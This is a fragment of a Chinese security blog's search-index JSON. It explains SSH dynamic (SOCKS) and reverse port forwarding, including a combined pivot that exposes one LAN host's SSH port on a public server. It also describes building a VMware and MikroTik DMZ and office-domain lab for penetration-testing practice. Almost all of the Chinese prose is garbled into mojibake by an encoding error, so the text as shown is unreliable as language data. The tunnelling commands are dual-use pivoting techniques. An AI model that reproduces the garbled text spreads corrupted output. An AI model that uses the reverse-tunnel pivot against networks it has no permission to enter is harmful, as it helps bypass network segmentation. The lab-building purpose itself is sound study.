åœ¨æœ¬åœ°ç«¯å£è½¬å‘å’Œè¿œç¨‹ç«¯å£è½¬å‘è¿‡ç¨‹ä¸­ï¼Œä¸€æ¬¡æ€§åªèƒ½è½¬å‘ä¸€ä¸ªç«¯å£ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹æ•ˆç‡å¤ªä½äº†ï¼Œè€ŒåŠ¨æ€ç«¯å£è½¬å‘æ²¡æœ‰æŒ‡å®šç›®çš„ç«¯å£ï¼Œç›¸å¯¹äºå‰ä¸¤ç§æ¥è¯´æ›´çµæ´»ã€‚å®é™…ä¸ŠåŠ¨æ€ç«¯å£è½¬å‘å³ä¸ºSSHå®ç°çš„SOCKSåè®®ã€‚å‘½ä»¤æ ¼å¼:ssh -D port \u0026lt;username\u0026gt;@\u0026lt;SSH host\u0026gt;ã€‚\nåœ¨SSH Clientæ‰§è¡Œå‘½ä»¤å³å¯åœ¨SSH Clientå’ŒSSH Serverä¹‹é—´å»ºç«‹socks5éš§é“ï¼ŒSSH Clientå¯ä»¥è¿æ¥è¯¥éš§é“æ¥ä¼ è¾“æ•°æ®ã€‚\nç»„åˆåˆ©ç”¨ åœ¨ä¸€äº›æƒ…å†µä¸‹å¯ä»¥é€šè¿‡ç»„åˆä¸Šé¢ä¸‰ç§è½¬å‘æ¥è¾¾åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚\nä¾‹å¦‚ï¼Œæœ‰ä¸¤å°ä½äºäº’ä¸ç›¸é€šçš„å±€åŸŸç½‘ä¸»æœºï¼Œå¦‚æœä¸€å°æƒ³è¦è®¿é—®å¦å¤–ä¸€å°èƒ½å¤Ÿè®¿é—®çš„æœåŠ¡æ—¶ï¼Œå¯ä»¥ä»¥ä¸‹é¢çš„æ–¹å¼è¾¾åˆ°ç›®çš„\nåœ¨ä¸»æœº1ä¸Šæ‰§è¡Œå‘½ä»¤ ssh -CfNg -R 9898:192.168.50.1:22 root\u0026lt;SSH Server\u0026gt; å°†ä¸»æœº1çš„sshç«¯å£è½¬å‘åˆ°å…¬ç½‘æœåŠ¡å™¨çš„9898ç«¯å£ã€‚\nåœ¨ä¸»æœº2æ‰§è¡Œå‘½ä»¤ssh -D 12222 -p 9898 \u0026lt;username\u0026gt;@\u0026lt;SSH Server\u0026gt; æ­¤æ—¶sshè¿æ¥çš„æ˜¯ä¸»æœº1ï¼Œä¸”å»ºç«‹äº†sockséš§é“ï¼Œé€šè¿‡è¯¥éš§é“ä¸»æœº2å¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨ä¸»æœº1èƒ½è®¿é—®è€Œä¸»æœº2ä¸èƒ½ç›´æ¥è®¿é—®çš„æœåŠ¡ã€‚\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/","title":"åŸºäºVmwareçš„å°å‹åŸŸç½‘ç»œæ­å»º","tags":[],"description":"","content":"åŸºäºVmwareçš„å°å‹åŸŸç½‘ç»œæ­å»º æ‘˜è¦ åœ¨æ¸—é€çš„æ—¥å¸¸å­¦ä¹ è¿‡ç¨‹ä¸­ç»å¸¸éœ€è¦ä¸€ä¸ªå†…ç½‘ç¯å¢ƒï¼Œæœ¬ç¯‡æ–‡ç« ä»‹ç»å¦‚ä½•ä½¿ç”¨Vmwareå’ŒMikroTikæ­å»ºç®€æ˜“çš„äºŒå±‚å†…ç½‘ç¯å¢ƒã€‚\nç½‘ç»œç»“æ„ æ•´ä¸ªç½‘ç»œåˆ†ä¸ºç»“æ„åˆ†ä¸ºä¸‰å±‚ï¼Œç¬¬ä¸€å±‚æ¨¡æ‹Ÿå¤–ç½‘ç¯å¢ƒï¼Œç¬¬äºŒå±‚ä¸ºDMZåŒºåŸŸï¼Œè¯¥åŒºåŸŸé€šè¿‡è¾¹ç•Œè·¯ç”±å™¨çš„ç«¯å£æ˜ å°„ï¼Œå°†ç¬¬äºŒå±‚ç½‘ç»œä¸»æœºçš„ä¸€äº›ç«¯å£æ˜ å°„åˆ°è¾¹ç•Œè·¯ç”±å™¨ä¸Šå¯¹å¤–æä¾›æœåŠ¡ï¼Œç¬¬ä¸‰å±‚æ¨¡æ‹ŸåŠå…¬ç½‘ï¼Œè¯¥å±‚ç½‘ç»œä¸ºåŸŸç½‘ç»œï¼ŒåŒæ—¶å¯ä»¥æ§åˆ¶ç¬¬äºŒå±‚ç½‘ç»œçš„ä¸»æœºã€‚\næ•´ä¸ªç½‘ç»œæ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š\nIPè®¾ç½®ï¼š\nç¬¬ä¸€å±‚ç½‘ç»œä¸ºï¼ˆå¤–ç½‘ï¼‰ï¼š192.168.59.0/24\nç¬¬äºŒå±‚ç½‘ç»œä¸ºï¼ˆDMZåŒºåŸŸï¼‰ï¼š192.168.72.0/24\nç¬¬ä¸‰å±‚ç½‘ç»œä¸ºï¼ˆåŠå…¬ç½‘ï¼‰ï¼š172.16.2.0/24\nè·¯ç”±å™¨IPåœ°å€ï¼š\nè¾¹ç•Œè·¯ç”±å™¨ï¼š192.168.59.141 | 192.168.72.2\nå†…ç½‘è·¯ç”±å™¨ï¼š192.168.72.254 | 172.16.2.254\nç½‘ç»œæ­å»º ç½‘ç»œè®¾ç½® é¦–å…ˆä½¿ç”¨VMwareçš„è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨å¢åŠ ä¸¤ä¸ªç½‘ç»œVMnet2ã€VMnet3ï¼Œéƒ½å‹¾é€‰ä»…ä¸»æœºæ¨¡å¼ï¼ŒåŒæ—¶å–æ¶ˆä¸‹é¢ä¸¤ä¸ªå‹¾ï¼Œå¦‚ä¸‹å›¾ï¼š\nVMnet3åŒç†ï¼ŒåŒæ—¶åœ¨DHCPè®¾ç½®å¤„è®¾ç½®ç›¸åº”çš„IPåœ°å€å’Œæ©ç ã€‚å…¶ä¸­å¤–å±‚ç½‘ç»œä¸ºnatæ¨¡å¼ï¼ŒVMnet2ä¸ºDMZåŒºåŸŸç½‘ç»œï¼ŒVMnet3ä¸ºåŠå…¬ç½‘ç»œ\nè™šæ‹Ÿæœºæ­å»º æ•´ä¸ªç½‘ç»œåœ¨æœ€å°‘æƒ…å†µä¸‹ä¸€å…±éœ€è¦å…­å°è™šæ‹Ÿæœºï¼Œåˆ†ä¸ºä¸¤å°ROSï¼Œå››å°ç½‘ç»œä¸­çš„ä¸»æœºã€‚\nROSä»hxxps://mikrotik.com/downloadä¸‹è½½stableç‰ˆæœ¬çš„ovaæ ¼å¼çš„é•œåƒï¼Œä¹‹åå¯¼å…¥åˆ°VMwareä¸­ã€‚ä¸€å…±éœ€è¦å¯¼å…¥ä¸¤æ¬¡ï¼Œåˆ†åˆ«å‘½åä¸ºROSï¼ŒROS-1ã€‚é™¤äº†ä¸‹è½½é•œåƒä¹‹å¤–è¿˜éœ€è¦ä¸‹è½½winboxæ–¹ä¾¿å¯¹è·¯ç”±å™¨è¿›è¡Œè®¾ç½®ã€‚\nç½‘ç»œä¸­ä¸»æœºåˆ†å¸ƒï¼š\nDMZï¼šUbuntu 2004ã€windows7\nåŠå…¬ç½‘ï¼šWindows server2019ã€windows7\nåˆ›å»ºä¸Šè¿°è™šæ‹Ÿæœºï¼Œå¹¶å°†DMZåŒºåŸŸçš„ä¸»æœºçš„ç½‘å¡è®¾ç½®ä¸ºVMnet2ï¼ŒåŠå…¬ç½‘çš„ä¸»æœºè®¾ç½®ä¸ºVMnet3.\nå°†è¾¹ç•Œè·¯ç”±å™¨ROSç½‘å¡è®¾ç½®ä¸ºnetæ¨¡å¼å’ŒVMnet2æ¨¡å¼ï¼Œå†…ç½‘è·¯ç”±å™¨è®¾ç½®ä¸ºVMnet2å’ŒVMnet3æ¨¡å¼ã€‚\nIPåœ°å€åŠè·¯ç”±å™¨è®¾ç½® ç»å†ä¸Šé¢çš„æ­¥éª¤ä¹‹åï¼ŒåŸºæœ¬çš„ç½‘ç»œæ‹“æ‰‘å·²ç»æ­å»ºå®Œæˆï¼Œæ¥ä¸‹æ¥éœ€è¦å¯¹ç½‘ç»œå†…çš„ä¸»æœºå’Œè·¯ç”±å™¨è¿›è¡Œè®¾ç½®ä½¿å¾—ç½‘ç»œä¸­çš„ä¸»æœºèƒ½å¤Ÿç›¸äº’pingé€šã€‚\né¦–å…ˆè®¾ç½®ä¸¤ä¸ªç½‘ç»œä¸­çš„ä¸»æœºIPåœ°å€\nDMZï¼š\nWindows7ï¼š192.168.72.4/24 ç½‘å…³192.168.72.2 DNS114.114.114.114\nUbuntu ï¼š192.168.72.3/24 ç½‘å…³192.168.72.2 DNS114.\n114.114.114\nåŠå…¬ç½‘ï¼š\nWindows server 2019ï¼š172.16.2.4/24 ç½‘å…³172.16. 2.254 DNS127.0.0.1\nwindows7ï¼š172.16.2.3/24 ç½‘å…³172.16.2.254 DNS172.16.2.4\nè‡³æ­¤ï¼Œä¸¤ä¸ªç½‘ç»œçš„ä¸»æœºåº”è¯¥å¯ä»¥pingé€šåŒä¸€ä¸ªç½‘ç»œçš„ä¸»æœºã€‚æ¥ä¸‹æ¥è®¾ç½®ä¸¤ä¸ªROSçš„IPåœ°å€ã€‚\næ‰“å¼€winboxï¼Œç‚¹å‡»NeighborsæŒ‰é’®ï¼Œä¼šè‡ªåŠ¨å—…æ¢ç½‘ç»œå†…çš„å­˜æ´»çš„è·¯ç”±å™¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\nä¸Šå›¾ä¸ºè¾¹ç•Œè·¯ç”±å™¨çš„IPåœ°å€ï¼Œå¦‚æœåˆ†é…äº†IPåœ°å€åˆ™å¯ä»¥åœ¨æµè§ˆå™¨é€šè¿‡IPåœ°å€æµè§ˆè·¯ç”±å™¨çš„webç•Œé¢ï¼Œåœ¨å¦‚æœæ²¡æœ‰åˆ†é…IPåœ°å€åˆ™é€šè¿‡wibboxä½¿ç”¨MACåœ°å€ç™»å½•\nè¿›å…¥ä¹‹åï¼Œåœ¨å·¦ä¾§é€‰é¡¹å¡ä¼šåˆ—å‡ºè·¯ç”±å™¨æ‹¥æœ‰çš„æ‰€æœ‰ç½‘å¡æ¥å£ï¼Œç‚¹å‡»ä¹‹åè¿›å…¥åˆ°æ¥å£è¯¦æƒ…ç•Œé¢ï¼Œåœ¨é‡Œé¢ä¼šåˆ—å‡ºè¯¥æ¥å£çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ç½‘å¡çš„MACåˆ†è¾¨è¯¥ç½‘å¡å¯¹åº”åœ¨vmwareä¸­çš„ç½‘å¡ï¼Œå°†ä¸¤ä¸ªç½‘å¡åç§°åˆ†åˆ«è®¾ç½®ä¸ºether1-wanå’Œether2-lanï¼Œä¹‹ååœ¨ip-\u0026gt;addressesé€‰é¡¹å¡ä¸­å°†ether-lanè®¾ç½®ä¸ºä¸‹å›¾ã€‚ether1-wanä¸ç”¨è®¾ç½®ï¼Œå› ä¸ºè¯¥ç½‘å¡ç½‘ç»œç±»å‹ä¸ºnatä¼šè‡ªåŠ¨dhcpåˆ†é…\nä¹‹ååœ¨IP-\u0026gt;Firewall-\u0026gt;NATä¸­æ–°å»ºè§„åˆ™ï¼Œchainï¼šsrcnatï¼Œout.interface:ether2-lan,action:masquerade\nè¯¥è§„åˆ™å°†ä½¿å¾—è·¯ç”±å™¨ä¸¤è¾¹çš„ç½‘ç»œè”é€šã€‚\nå‚è€ƒ\nhttps://www.huaweicloud.com/articles/401014315f14d0fb8d5e3f5489693621.html http://www.roszj.com/1692.html http://www.irouteros.com/?p=583\n"},{"uri":"https://www.ch35tnut.site/zh-cn/categories/","title":"Categories","tags":[],"description":"","content":""}]